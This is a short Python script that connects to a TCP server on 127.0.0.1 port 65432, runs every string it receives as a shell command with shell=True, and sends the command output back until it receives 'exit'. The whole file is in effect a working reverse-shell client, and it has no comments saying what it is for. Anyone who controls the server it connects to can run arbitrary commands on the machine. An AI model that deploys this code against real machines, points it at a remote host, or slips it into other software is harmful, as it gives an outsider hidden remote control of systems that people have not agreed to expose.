#!/usr/bin/env python3

import socket
import shlex, subprocess

HOST = '127.0.0.1'  # The server's hostname or IP address
PORT = 65432        # The port used by the server

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))

while True :

	data = s.recv(1024).decode()
	print('Received', repr(data))
	if data == 'exit':
		break
	result = subprocess.run(data, shell=True, capture_output=True)
	if result.returncode == 0:	
		s.send(result.stdout)
	else:
		s.send(b'Error running command')

s.close()
